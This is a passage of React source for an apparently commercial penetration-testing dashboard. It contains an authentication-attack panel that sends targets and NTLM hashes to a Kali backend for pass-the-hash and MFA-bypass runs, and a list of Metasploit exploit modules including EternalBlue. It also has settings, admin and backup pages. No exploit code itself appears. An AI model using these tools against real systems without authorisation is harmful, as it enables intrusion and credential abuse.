        <div style={{fontSize:20,fontWeight:700,color:"#f8fafc",marginBottom:16}}>Cloud Attacks</div>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:12}}>
          {[["TARGET (IP or URL)",target,setTarget,"192.168.56.101"],
            ["S3 BUCKET NAME",bucket,setBucket,"my-company-bucket"],
            ["AWS REGION",region,setRegion,"us-east-1"]].map(([label,val,set,ph])=>(
            <div key={label}>
              <div style={{fontSize:11,color:"#64748b",marginBottom:4}}>{label}</div>
              <input value={val} onChange={e=>set(e.target.value)} placeholder={ph}
                style={{width:"100%",background:"#1e293b",border:"1px solid #334155",borderRadius:6,
                  padding:"8px 12px",color:"#f8fafc",fontSize:12,boxSizing:"border-box"}}/>
            </div>
          ))}
        </div>
      </div>
      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:16}}>
        {attacks.map(atk=>{
          const res=results[atk.id]; const busy=loading===atk.id;
          return (
            <div key={atk.id} style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:12,overflow:"hidden"}}>
              <div style={{padding:"14px 18px",borderBottom:"1px solid #1e293b",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
                <div>
                  <div style={{fontSize:14,fontWeight:700,color:"#f8fafc"}}>{atk.icon} {atk.label}</div>
                  <div style={{fontSize:11,color:"#64748b",marginTop:2}}>{atk.desc}</div>
                </div>
                <button onClick={()=>run(atk)} disabled={busy}
                  style={{background:busy?"#1e293b":"#0369a1",color:"#f8fafc",border:"none",
                    borderRadius:8,padding:"7px 14px",cursor:busy?"not-allowed":"pointer",fontSize:12,fontWeight:600}}>
                  {busy?"Running...":"Run"}
                </button>
              </div>
              {res&&<div style={{padding:14}}>
                {res.error&&<div style={{color:"#ef4444",fontSize:12}}>{res.error}</div>}
                {res.commands&&<div style={{marginBottom:8}}>
                  <div style={{fontSize:11,color:"#64748b",marginBottom:4}}>Commands:</div>
                  {Object.entries(res.commands).slice(0,4).map(([k,v])=>(
                    <div key={k} style={{marginBottom:4}}>
                      <div style={{fontSize:10,color:"#94a3b8"}}>{k}:</div>
                      <code style={{display:"block",background:"#020617",color:"#86efac",fontSize:10,
                        padding:"4px 8px",borderRadius:4,overflowX:"auto",whiteSpace:"pre"}}>{v}</code>
                    </div>
                  ))}
                </div>}
                {res.files_found&&res.files_found.length>0&&<div style={{marginBottom:8}}>
                  <div style={{fontSize:11,color:"#ef4444",fontWeight:700}}>Files in bucket:</div>
                  {res.files_found.slice(0,10).map((f,i)=>(
                    <div key={i} style={{fontSize:11,color:"#fbbf24",fontFamily:"monospace"}}>{f}</div>
                  ))}
                </div>}
                {res.findings&&res.findings.map((f,i)=>(
                  <div key={i} style={{background:"#1e293b",borderRadius:6,padding:10,marginBottom:6,
                    borderLeft:`3px solid ${sevColor(f.severity)}`}}>
                    <span style={{background:sevColor(f.severity),color:"#000",fontSize:10,
                      fontWeight:700,padding:"1px 5px",borderRadius:3,marginRight:6}}>{f.severity}</span>
                    <span style={{fontSize:11,color:"#e2e8f0"}}>{f.detail}</span>
                    {f.remediation&&<div style={{fontSize:10,color:"#60a5fa",marginTop:4}}>Fix: {f.remediation}</div>}
                  </div>
                ))}
              </div>}
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
//  AUTH ATTACKS MODULE
// ═══════════════════════════════════════════════════════════════
function AuthAttacksModule({token}) {
  const API = getApiUrl();
  const [target,   setTarget]   = useState("");
  const [username, setUsername] = useState("admin");
  const [hash,     setHash]     = useState("");
  const [domain,   setDomain]   = useState("WORKGROUP");
  const [port,     setPort]     = useState(445);
  const [loading,  setLoading]  = useState("");
  const [results,  setResults]  = useState({});

  const attacks = [
    {id:"mfabypass", label:"MFA Bypass",      icon:"🔐", ep:"/api/auth/mfabypass", desc:"Test for MFA bypass, direct access, header injection"},
    {id:"pth",       label:"Pass-the-Hash",   icon:"#️⃣", ep:"/api/auth/pth",       desc:"Authenticate using NTLM hash (crackmapexec + impacket)"},
    {id:"ptt",       label:"Pass-the-Ticket", icon:"🎫", ep:"/api/auth/ptt",       desc:"Detect Kerberos attack surface, AS-REP roasting"},
    {id:"keylog",    label:"Keylog Detection",icon:"⌨️", ep:"/api/auth/keylog",    desc:"Detect open ports exploitable for keylogging"},
  ];

  const run = async (atk) => {
    if (!target) return;
    setLoading(atk.id);
    try {
      const r = await fetch(`${API}${atk.ep}`, {
        method: "POST",
        headers: {"Content-Type":"application/json","Authorization":`Bearer ${token}`},
        body: JSON.stringify({target, username, hash, domain, port: parseInt(port)||445})
      });
      if (!r.ok) {
        let detail = `HTTP ${r.status}`;
        try { const j = await r.json(); detail = j.detail || j.error || detail; } catch {}
        setResults(prev => ({...prev, [atk.id]: {error: detail, status: r.status}}));
      } else {
        const data = await r.json();
        setResults(prev => ({...prev, [atk.id]: data}));
      }
    } catch(e) {
      setResults(prev => ({...prev, [atk.id]: {error: e.message}}));
    }
    setLoading("");
  };

  const sevColor = s => ({CRITICAL:"#ef4444",HIGH:"#f97316",MEDIUM:"#eab308",LOW:"#22c55e",INFO:"#60a5fa"}[s]||"#94a3b8");

  return (
    <div style={{padding:24,maxWidth:1100,margin:"0 auto"}}>
      <div style={{marginBottom:24,background:"#0f172a",borderRadius:12,padding:20,border:"1px solid #1e293b"}}>
        <div style={{fontSize:20,fontWeight:700,color:"#f8fafc",marginBottom:16}}>Authentication Attacks</div>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,marginBottom:12}}>
          <div>
            <div style={{fontSize:11,color:"#64748b",marginBottom:4}}>TARGET (IP or URL)</div>
            <input value={target} onChange={e=>setTarget(e.target.value)} placeholder="192.168.56.101 or http://target"
              style={{width:"100%",background:"#1e293b",border:"1px solid #334155",borderRadius:6,padding:"8px 12px",color:"#f8fafc",fontSize:13,boxSizing:"border-box"}}/>
          </div>
          <div>
            <div style={{fontSize:11,color:"#64748b",marginBottom:4}}>USERNAME</div>
            <input value={username} onChange={e=>setUsername(e.target.value)} placeholder="admin"
              style={{width:"100%",background:"#1e293b",border:"1px solid #334155",borderRadius:6,padding:"8px 12px",color:"#f8fafc",fontSize:13,boxSizing:"border-box"}}/>
          </div>
          <div>
            <div style={{fontSize:11,color:"#64748b",marginBottom:4}}>NTLM HASH (for Pass-the-Hash)</div>
            <input value={hash} onChange={e=>setHash(e.target.value)} placeholder="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
              style={{width:"100%",background:"#1e293b",border:"1px solid #334155",borderRadius:6,padding:"8px 12px",color:"#f8fafc",fontSize:13,fontFamily:"monospace",boxSizing:"border-box"}}/>
          </div>
          <div>
            <div style={{fontSize:11,color:"#64748b",marginBottom:4}}>DOMAIN (for PTH/PTT)</div>
            <input value={domain} onChange={e=>setDomain(e.target.value)} placeholder="WORKGROUP"
              style={{width:"100%",background:"#1e293b",border:"1px solid #334155",borderRadius:6,padding:"8px 12px",color:"#f8fafc",fontSize:13,boxSizing:"border-box"}}/>
          </div>
        </div>
      </div>

      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:16}}>
        {attacks.map(atk => {
          const res = results[atk.id];
          const isLoading = loading === atk.id;
          return (
            <div key={atk.id} style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:12,overflow:"hidden"}}>
              <div style={{padding:"16px 20px",borderBottom:"1px solid #1e293b",display:"flex",alignItems:"center",justifyContent:"space-between"}}>
                <div>
                  <div style={{fontSize:15,fontWeight:700,color:"#f8fafc"}}>{atk.icon} {atk.label}</div>
                  <div style={{fontSize:11,color:"#64748b",marginTop:2}}>{atk.desc}</div>
                </div>
                <button onClick={()=>run(atk)} disabled={isLoading||!target}
                  style={{background:isLoading?"#1e293b":"#7c3aed",color:"#f8fafc",border:"none",borderRadius:8,padding:"8px 16px",
                    cursor:isLoading||!target?"not-allowed":"pointer",fontSize:12,fontWeight:600,whiteSpace:"nowrap"}}>
                  {isLoading ? "Running..." : "Run"}
                </button>
              </div>
              {res && (
                <div style={{padding:16}}>
                  {res.error && <div style={{color:"#ef4444",fontSize:12}}>{res.error}</div>}
                  {res.findings && res.findings.map((f,i)=>(
                    <div key={i} style={{background:"#1e293b",borderRadius:8,padding:12,marginBottom:8,borderLeft:`3px solid ${sevColor(f.severity)}`}}>
                      <div style={{display:"flex",gap:8,alignItems:"center",marginBottom:4}}>
                        <span style={{background:sevColor(f.severity),color:"#000",fontSize:10,fontWeight:700,padding:"2px 6px",borderRadius:4}}>{f.severity}</span>
                        <span style={{fontSize:10,color:"#64748b"}}>CVSS {f.cvss} | {f.cwe}</span>
                      </div>
                      <div style={{fontSize:12,color:"#e2e8f0",marginBottom:4}}>{f.detail}</div>
                      <div style={{fontSize:11,color:"#60a5fa"}}>Fix: {f.remediation}</div>
                    </div>
                  ))}
                  {res.raw_output && (
                    <details style={{marginTop:8}}>
                      <summary style={{color:"#64748b",fontSize:11,cursor:"pointer"}}>Raw Output</summary>
                      <pre style={{background:"#020617",color:"#94a3b8",fontSize:10,padding:8,borderRadius:4,overflow:"auto",maxHeight:150,marginTop:4}}>{res.raw_output}</pre>
                    </details>
                  )}
                </div>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
//  METASPLOIT MODULE
// ═══════════════════════════════════════════════════════════════
function MetasploitModule(props) {
  const [search,setSearch] = useState("");

  const commonModules = [
    {name:"exploit/multi/handler",         type:"Exploit",  desc:"Generic payload handler for reverse shells"},
    {name:"auxiliary/scanner/portscan/tcp", type:"Scanner",  desc:"TCP port scanner"},
    {name:"auxiliary/scanner/smb/smb_ms17_010",type:"Scanner",desc:"EternalBlue vulnerability check (MS17-010)"},
    {name:"exploit/windows/smb/ms17_010_eternalblue",type:"Exploit",desc:"EternalBlue SMB exploit"},
    {name:"auxiliary/scanner/http/http_version",type:"Scanner",desc:"HTTP version scanner"},
    {name:"post/multi/recon/local_exploit_suggester",type:"Post",desc:"Suggest local privilege escalation exploits"},
    {name:"auxiliary/scanner/ssh/ssh_login",type:"Scanner",  desc:"SSH brute force login scanner"},
    {name:"exploit/unix/ftp/vsftpd_234_backdoor",type:"Exploit",desc:"VSFTPD 2.3.4 backdoor exploit"},
    {name:"auxiliary/scanner/mysql/mysql_login",type:"Scanner",desc:"MySQL brute force login"},
    {name:"post/linux/gather/enum_system",  type:"Post",     desc:"Enumerate Linux system information"},
    {name:"auxiliary/scanner/http/dir_scanner",type:"Scanner",desc:"HTTP directory scanner"},
    {name:"exploit/windows/http/rejetto_hfs_exec",type:"Exploit",desc:"HFS HTTP File Server exploit"},
  ];

  const filtered = commonModules.filter(m=>
    !search || m.name.toLowerCase().includes(search.toLowerCase()) || m.desc.toLowerCase().includes(search.toLowerCase())
  );

  const typeColor = {Exploit:"#dc2626",Scanner:"#3b82f6",Post:"#f59e0b",Auxiliary:"#22c55e"};

  return (
    <div className="fade">
      <div style={{background:"linear-gradient(135deg,#1c0a0a,#0f172a)",border:"1px solid #7f1d1d",borderRadius:8,padding:20,marginBottom:16}}>
        <h2 style={{fontSize:15,fontWeight:600,color:"#f1f5f9",marginBottom:4}}>🧰 Metasploit Framework</h2>
        <p style={{fontSize:12,color:"#64748b",marginBottom:12}}>Search and reference common MSF modules</p>
        <div style={{background:"#1c0a0a",border:"1px solid #7f1d1d",borderRadius:6,padding:"10px 12px",marginBottom:12,fontSize:11,color:"#d97706"}}>
          ⚠ To run Metasploit: Open Kali terminal → type <span style={{fontFamily:"monospace",color:"#f87171"}}>msfconsole</span> → use modules listed below
        </div>
        <input value={search} onChange={e=>setSearch(e.target.value)}
          placeholder="Search modules (e.g. smb, ssh, http)..."
          style={{width:"100%",background:"#020617",border:"1px solid #7f1d1d",borderRadius:6,padding:"10px 14px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:13,outline:"none",boxSizing:"border-box"}}/>
      </div>

      <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,overflow:"hidden"}}>
        <div style={{padding:"10px 16px",borderBottom:"1px solid #1e293b",display:"flex",justifyContent:"space-between"}}>
          <span style={{fontSize:12,fontWeight:600,color:"#f1f5f9"}}>Available Modules</span>
          <span style={{fontSize:10,color:"#475569"}}>{filtered.length} modules</span>
        </div>
        {filtered.map((m,i)=>(
          <div key={i} style={{padding:"12px 16px",borderBottom:"1px solid #0f172a",background:i%2===0?"#020617":"transparent"}}>
            <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:4}}>
              <span style={{background:(typeColor[m.type]||"#64748b")+"20",color:typeColor[m.type]||"#64748b",fontSize:9,fontWeight:700,padding:"2px 8px",borderRadius:3,flexShrink:0}}>{m.type}</span>
              <span style={{fontSize:12,color:"#60a5fa",fontFamily:"monospace",fontWeight:600}}>{m.name}</span>
            </div>
            <div style={{fontSize:11,color:"#64748b",marginBottom:6}}>{m.desc}</div>
            <div style={{background:"#020617",borderRadius:4,padding:"6px 10px",fontFamily:"monospace",fontSize:10,color:"#22c55e"}}>
              msf6 {'>'} use {m.name}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
//  SETTINGS MODULE
// ═══════════════════════════════════════════════════════════════
function SettingsModule() {
  const [apiUrl,     setApiUrl]     = useState(getApiUrl());
  const [shodanKey,  setShodanKey]  = useState(localStorage.getItem("shodanApiKey")   || "");
  const [vtKey,      setVtKey]      = useState(localStorage.getItem("vtApiKey")        || "");
  const [saved, setSaved] = useState(false);

  const save = () => {
    localStorage.setItem("cyberApiUrl",  apiUrl.trim());
    localStorage.setItem("shodanApiKey", shodanKey.trim());
    localStorage.setItem("vtApiKey",     vtKey.trim());
    setSaved(true);
    setTimeout(() => { setSaved(false); window.location.reload(); }, 1200);
  };

  const reset = () => {
    localStorage.removeItem("cyberApiUrl");
    setApiUrl(getApiUrl());
  };

  return (
    <div className="fade" style={{maxWidth:680,margin:"0 auto",padding:24}}>
      <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:10,padding:28,marginBottom:16}}>
        <h2 style={{fontSize:16,fontWeight:700,color:"#f1f5f9",marginBottom:4}}>⚙ Settings & Configuration</h2>
        <p style={{fontSize:12,color:"#64748b",marginBottom:24}}>Configure your VulnusLab backend connection.</p>

        <div style={{marginBottom:20}}>
          <label style={{fontSize:11,color:"#94a3b8",fontWeight:700,display:"block",marginBottom:8,textTransform:"uppercase",letterSpacing:1}}>
            Kali Backend API URL
          </label>
          <div style={{display:"flex",gap:8}}>
            <input
              value={apiUrl}
              onChange={e => setApiUrl(e.target.value)}
              placeholder="http://192.168.1.x:8000"
              style={{flex:1,background:"#020617",border:"1px solid #1e293b",borderRadius:6,padding:"10px 14px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:13,outline:"none"}}
            />
            <button onClick={save}
              style={{background:"linear-gradient(135deg,#1d4ed8,#3b82f6)",border:"none",borderRadius:6,padding:"10px 20px",color:"#fff",fontSize:13,fontWeight:700,cursor:"pointer"}}>
              {saved ? "Saved ✓" : "Save & Reload"}
            </button>
          </div>
          <div style={{fontSize:11,color:"#475569",marginTop:6}}>
            This is the IP:port of your Kali Linux machine running the backend API.
          </div>
        </div>

        {/* API Keys */}
        <div style={{marginBottom:20}}>
          <label style={{fontSize:11,color:"#94a3b8",fontWeight:700,display:"block",marginBottom:8,textTransform:"uppercase",letterSpacing:1}}>Shodan API Key <span style={{color:"#475569",fontWeight:400,textTransform:"none"}}>(for Recon module)</span></label>
          <input value={shodanKey} onChange={e=>setShodanKey(e.target.value)}
            placeholder="Paste your Shodan API key — get free key at shodan.io"
            style={{width:"100%",background:"#020617",border:"1px solid #1e293b",borderRadius:6,padding:"10px 14px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:12,outline:"none",boxSizing:"border-box"}}/>
        </div>
        <div style={{marginBottom:20}}>
          <label style={{fontSize:11,color:"#94a3b8",fontWeight:700,display:"block",marginBottom:8,textTransform:"uppercase",letterSpacing:1}}>VirusTotal API Key <span style={{color:"#475569",fontWeight:400,textTransform:"none"}}>(for Recon module)</span></label>
          <input value={vtKey} onChange={e=>setVtKey(e.target.value)}
            placeholder="Paste your VirusTotal API key — get free key at virustotal.com"
            style={{width:"100%",background:"#020617",border:"1px solid #1e293b",borderRadius:6,padding:"10px 14px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:12,outline:"none",boxSizing:"border-box"}}/>
        </div>

        <div style={{background:"#020617",border:"1px solid #1e293b",borderRadius:8,padding:16,marginBottom:16}}>
          <div style={{fontSize:12,fontWeight:600,color:"#94a3b8",marginBottom:10}}>Current Connection</div>
          <div style={{display:"flex",gap:24,flexWrap:"wrap"}}>
            <div><div style={{fontSize:10,color:"#475569",marginBottom:3}}>API URL</div><div style={{fontSize:12,color:"#60a5fa",fontFamily:"JetBrains Mono,monospace"}}>{apiUrl}</div></div>
            <div><div style={{fontSize:10,color:"#475569",marginBottom:3}}>Status</div><div style={{fontSize:12,color:"#22c55e",fontFamily:"JetBrains Mono,monospace"}}>Configured</div></div>
          </div>
        </div>

        <div style={{background:"#1c0a0a",border:"1px solid #7f1d1d",borderRadius:8,padding:14}}>
          <div style={{fontSize:11,color:"#d97706",fontWeight:700,marginBottom:6}}>⚠ Important</div>
          <ul style={{fontSize:11,color:"#64748b",lineHeight:2,paddingLeft:16}}>
            <li>Only scan systems you own or have written permission to test.</li>
            <li>The backend must be running on your Kali machine: <code style={{color:"#60a5fa"}}>uvicorn main:app --host 0.0.0.0 --port 8000</code></li>
            <li>All scan results are real — generated by actual security tools installed on Kali.</li>
            <li>Change is applied immediately after save & reload.</li>
          </ul>
        </div>

        <div style={{marginTop:16,textAlign:"right"}}>
          <button onClick={reset} style={{background:"none",border:"1px solid #334155",borderRadius:6,padding:"8px 16px",color:"#64748b",fontSize:12,cursor:"pointer"}}>
            Reset to Default
          </button>
        </div>
      </div>
    </div>
  );
}

function AdminPanel({ token }) {
  const [users, setUsers]       = useState([]);
  const [loading, setLoading]   = useState(true);
  const [search, setSearch]     = useState("");
  const [msg, setMsg]           = useState("");
  const [extDays, setExtDays]   = useState(30);
  const [selPlan, setSelPlan]   = useState("pro");

  const load = async () => {
    setLoading(true);
    try { const d = await api("/api/admin/users","GET",null,token); setUsers(d.users||[]); }
    catch(e) { setMsg("Error: "+e.message); }
    setLoading(false);
  };

  useEffect(() => { load(); }, []);

  const act = async (url, method="POST", body=null) => {
    try {
      await api(url, method, body, token);
      setMsg("Done!");
      load();
    } catch(e) { setMsg("Error: "+e.message); }
    setTimeout(()=>setMsg(""),3000);
  };

  const statusColor = (u) => {
    if (u.status === "suspended") return "#ef4444";
    if (u.expiry_status === "expired") return "#ef4444";
    if (u.expiry_status === "expiring_soon") return "#f59e0b";
    return "#22c55e";
  };

  const statusLabel = (u) => {
    if (u.status === "suspended") return "SUSPENDED";
    if (u.expiry_status === "expired") return "EXPIRED";
    if (u.expiry_status === "expiring_soon") return `EXPIRING IN ${u.days_left}d`;
    if (u.days_left !== null) return `${u.days_left}d LEFT`;
    return "ACTIVE";
  };

  const filtered = users.filter(u =>
    u.username.toLowerCase().includes(search.toLowerCase()) ||
    u.email.toLowerCase().includes(search.toLowerCase())
  );

  const stats = {
    total: users.length,
    active: users.filter(u => u.status==="active" && u.expiry_status !== "expired").length,
    expiring: users.filter(u => u.expiry_status==="expiring_soon").length,
    expired: users.filter(u => u.expiry_status==="expired" || u.status==="suspended").length,
  };

  return (
    <div className="fade" style={{padding:24,fontFamily:"Inter,sans-serif"}}>
      {/* Header */}
      <div style={{display:"flex",alignItems:"center",gap:12,marginBottom:24}}>
        <span style={{fontSize:28}}>👑</span>
        <div>
          <h2 style={{fontSize:20,fontWeight:800,color:"#f1f5f9",margin:0}}>Admin Panel</h2>
          <p style={{fontSize:12,color:"#64748b",margin:0}}>Manage users, subscriptions and access</p>
        </div>
        <button onClick={load} style={{marginLeft:"auto",background:"#1e293b",border:"1px solid #334155",color:"#94a3b8",padding:"8px 16px",borderRadius:8,cursor:"pointer",fontSize:12,fontWeight:600}}>↻ Refresh</button>
      </div>

      {/* Stats */}
      <div style={{display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:12,marginBottom:24}}>
        {[
          {label:"Total Users",   val:stats.total,    color:"#3b82f6"},
          {label:"Active",        val:stats.active,   color:"#22c55e"},
          {label:"Expiring Soon", val:stats.expiring, color:"#f59e0b"},
          {label:"Expired",       val:stats.expired,  color:"#ef4444"},
        ].map((s,i)=>(
          <div key={i} style={{background:"#0f172a",border:`1px solid ${s.color}30`,borderTop:`3px solid ${s.color}`,borderRadius:10,padding:16}}>
            <div style={{fontSize:28,fontWeight:800,color:s.color}}>{s.val}</div>
            <div style={{fontSize:12,color:"#64748b",fontWeight:600,marginTop:4}}>{s.label}</div>
          </div>
        ))}
      </div>

      {/* Message */}
      {msg && <div style={{background:"#052e16",border:"1px solid #166534",borderRadius:8,padding:"10px 16px",color:"#4ade80",fontSize:13,marginBottom:16}}>{msg}</div>}

      {/* Search */}
      <input value={search} onChange={e=>setSearch(e.target.value)}
        placeholder="Search by username or email..."
        style={{width:"100%",background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,padding:"10px 16px",color:"#e2e8f0",fontSize:13,outline:"none",marginBottom:16,boxSizing:"border-box"}}/>

      {/* Users Table */}
      {loading ? <div style={{textAlign:"center",padding:40,color:"#475569"}}>Loading users...</div> : (
        <div style={{display:"flex",flexDirection:"column",gap:10}}>
          {filtered.map(u=>(
            <div key={u.id} style={{background:"#0a0f1e",border:`1px solid ${u.username==="ADMIN"?"#7c3aed30":"#1e293b"}`,borderLeft:`4px solid ${statusColor(u)}`,borderRadius:10,padding:"16px 20px"}}>
              <div style={{display:"flex",alignItems:"center",gap:12,flexWrap:"wrap"}}>

                {/* User info */}
                <div style={{flex:1,minWidth:200}}>
                  <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:4}}>
                    <span style={{fontSize:15,fontWeight:700,color:"#f1f5f9"}}>{u.username}</span>
                    {u.username==="ADMIN" && <span style={{fontSize:10,color:"#a78bfa",fontWeight:700,background:"#3b0764",padding:"2px 8px",borderRadius:4}}>SUPERADMIN</span>}
                    <span style={{fontSize:10,color:"#64748b",background:"#1e293b",padding:"2px 8px",borderRadius:4,fontWeight:600}}>{u.plan?.toUpperCase()}</span>
                    <span style={{fontSize:10,color:statusColor(u),fontWeight:700,background:statusColor(u)+"15",padding:"2px 8px",borderRadius:4}}>{statusLabel(u)}</span>
                  </div>
                  <div style={{fontSize:12,color:"#64748b"}}>{u.email}</div>
                  <div style={{fontSize:11,color:"#334155",marginTop:2,fontFamily:"JetBrains Mono,monospace"}}>
                    Joined: {u.created_at?.slice(0,10)} &nbsp;|&nbsp; Scans: {u.scan_count||0}
                    {u.expires_at && <> &nbsp;|&nbsp; Expires: {u.expires_at?.slice(0,10)}</>}
                  </div>
                </div>

                {/* Actions */}
                {u.username !== "ADMIN" && (
                  <div style={{display:"flex",gap:8,flexWrap:"wrap",alignItems:"center"}}>
                    {/* Extend */}
                    <div style={{display:"flex",gap:4,alignItems:"center"}}>
                      <select value={extDays} onChange={e=>setExtDays(Number(e.target.value))}
                        style={{background:"#1e293b",border:"1px solid #334155",color:"#94a3b8",borderRadius:6,padding:"5px 8px",fontSize:11,cursor:"pointer"}}>
                        {[7,14,30,60,90,180,365].map(d=><option key={d} value={d}>{d} days</option>)}
                      </select>
                      <button onClick={()=>act(`/api/admin/users/${u.username}/extend`,"POST",{days:extDays,plan:selPlan})}
                        style={{background:"#166534",border:"none",color:"#4ade80",padding:"6px 12px",borderRadius:6,cursor:"pointer",fontSize:11,fontWeight:700}}>
                        + Extend
                      </button>
                    </div>

                    {/* Plan */}
                    <div style={{display:"flex",gap:4,alignItems:"center"}}>
                      <select value={selPlan} onChange={e=>setSelPlan(e.target.value)}
                        style={{background:"#1e293b",border:"1px solid #334155",color:"#94a3b8",borderRadius:6,padding:"5px 8px",fontSize:11,cursor:"pointer"}}>
                        {["trial","pro","enterprise","pro_lifetime"].map(p=><option key={p} value={p}>{p}</option>)}
                      </select>
                      <button onClick={()=>act(`/api/admin/users/${u.username}/plan`,"POST",{plan:selPlan})}
                        style={{background:"#1e3a8a",border:"none",color:"#60a5fa",padding:"6px 12px",borderRadius:6,cursor:"pointer",fontSize:11,fontWeight:700}}>
                        Set Plan
                      </button>
                    </div>

                    {/* Suspend / Activate / Delete */}
                    {u.status==="active"
                      ? <button onClick={()=>act(`/api/admin/users/${u.username}/suspend`)}
                          style={{background:"#451a03",border:"none",color:"#f97316",padding:"6px 12px",borderRadius:6,cursor:"pointer",fontSize:11,fontWeight:700}}>
                          Suspend
                        </button>
                      : <button onClick={()=>act(`/api/admin/users/${u.username}/activate`)}
                          style={{background:"#052e16",border:"none",color:"#22c55e",padding:"6px 12px",borderRadius:6,cursor:"pointer",fontSize:11,fontWeight:700}}>
                          Activate
                        </button>
                    }
                    <button onClick={()=>{ if(window.confirm(`Delete ${u.username}?`)) act(`/api/admin/users/${u.username}`,"DELETE"); }}
                      style={{background:"#1c0000",border:"1px solid #7f1d1d",color:"#f87171",padding:"6px 12px",borderRadius:6,cursor:"pointer",fontSize:11,fontWeight:700}}>
                      Delete
                    </button>
                  </div>
                )}
              </div>
            </div>
          ))}
          {filtered.length===0 && <div style={{textAlign:"center",padding:40,color:"#475569"}}>No users found</div>}
        </div>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════
// USER BACKUPS MODULE — Phase E
// ═══════════════════════════════════════════════════════════════════
function UserBackupsModule({token}) {
  const [snapshots, setSnapshots] = useState([]);
  const [zoneSize, setZoneSize] = useState(0);
  const [snapshotCount, setSnapshotCount] = useState(0);
  const [loading, setLoading] = useState(false);
  const [msg, setMsg] = useState(null);

  const refresh = async () => {
    try {
      const data = await api("/api/user/backups", "GET", null, token);
      setSnapshots(data.snapshots || []);
      setZoneSize(data.zone_size || 0);
      setSnapshotCount(data.snapshot_count || 0);
    } catch(e) { setMsg({type:"error", text: e.message}); }
  };
  useEffect(() => { refresh(); }, []);

  const takeSnapshot = async () => {
    setLoading(true); setMsg(null);
    try {
      const r = await api("/api/user/backups/snapshot", "POST", {}, token);
      setMsg({type:"success", text: "Snapshot created: " + r.snapshot_name});
      await refresh();
    } catch(e) { setMsg({type:"error", text: e.message}); }
    finally { setLoading(false); }
  };

  const deleteSnapshot = async (snap) => {
    if (!window.confirm("Permanently delete " + snap + "? This cannot be undone.")) return;
    setLoading(true); setMsg(null);
    try {
      await api("/api/user/backups/" + snap, "DELETE", null, token);
      setMsg({type:"success", text: "Deleted " + snap});
      await refresh();
    } catch(e) { setMsg({type:"error", text: e.message}); }
    finally { setLoading(false); }
  };

  const restoreSnapshot = async (snap) => {
    if (!window.confirm("Restore from " + snap + "? Your current data will be replaced.")) return;
    setLoading(true); setMsg(null);
    try {
      await api("/api/user/backups/restore", "POST", {snapshot_name: snap}, token);
      setMsg({type:"success", text: "Restored from " + snap});
      await refresh();
    } catch(e) { setMsg({type:"error", text: e.message}); }
    finally { setLoading(false); }
  };

  const fmt = b => !b ? "0 B" : b < 1024 ? b+" B" : b < 1048576 ? (b/1024).toFixed(1)+" KB" : (b/1048576).toFixed(1)+" MB";

  return (
    <div style={{padding:"24px 32px",color:"#e2e8f0",minHeight:"100vh",overflow:"auto"}}>
      <div style={{maxWidth:1200, margin:"0 auto"}}>
        <h1 style={{fontSize:26,fontWeight:700,marginBottom:6}}>📦 My Backups</h1>
        <p style={{color:"#94a3b8",marginBottom:24,fontSize:14}}>
          Your data is private and auto-snapshotted. Take manual snapshots before risky changes; restore or delete any of them.
        </p>
        <div style={{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:16,marginBottom:20}}>
          <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:10,padding:16}}>
            <div style={{color:"#94a3b8",fontSize:11,letterSpacing:1,marginBottom:6}}>SNAPSHOTS</div>
            <div style={{fontSize:28,fontWeight:700,color:"#3b82f6"}}>{snapshotCount}</div>
          </div>
          <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:10,padding:16}}>
            <div style={{color:"#94a3b8",fontSize:11,letterSpacing:1,marginBottom:6}}>ZONE SIZE</div>
            <div style={{fontSize:28,fontWeight:700,color:"#3b82f6"}}>{fmt(zoneSize)}</div>
          </div>
          <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:10,padding:16}}>
            <div style={{color:"#94a3b8",fontSize:11,letterSpacing:1,marginBottom:6}}>RETENTION</div>
            <div style={{fontSize:28,fontWeight:700,color:"#3b82f6"}}>10 max</div>
          </div>
        </div>
        <div style={{display:"flex",gap:12,marginBottom:20}}>
          <button onClick={takeSnapshot} disabled={loading}
            style={{padding:"10px 18px",background:"#3b82f6",color:"#fff",border:"none",borderRadius:8,fontWeight:600,cursor:loading?"wait":"pointer",fontSize:14}}>
            {loading ? "Working..." : "+ Take Snapshot Now"}
          </button>
          <button onClick={refresh} disabled={loading}
            style={{padding:"10px 18px",background:"#1e293b",color:"#e2e8f0",border:"1px solid #334155",borderRadius:8,fontWeight:600,cursor:"pointer",fontSize:14}}>
            ↻ Refresh
          </button>
        </div>
        {msg && (
          <div style={{padding:"10px 16px",borderRadius:8,marginBottom:16,background: msg.type==="error" ? "#7f1d1d" : "#14532d", color:"#fff",fontSize:14}}>
            {msg.text}
          </div>
        )}
        <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:10,overflow:"hidden"}}>
          <div style={{padding:"12px 16px",borderBottom:"1px solid #1e293b",fontWeight:600,fontSize:14}}>
            Your Snapshots (newest first)
          </div>
          {snapshots.length === 0 ? (
